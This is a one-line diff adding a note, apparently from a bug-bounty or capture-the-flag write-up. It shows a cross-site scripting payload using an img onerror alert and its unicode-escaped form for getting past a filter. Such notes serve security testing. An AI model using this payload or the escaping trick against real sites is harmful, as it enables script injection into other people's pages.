@@ -1,0 +1,1 @@
+For this payload "><img src=x onerror=alert(1)><x y=" we have to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
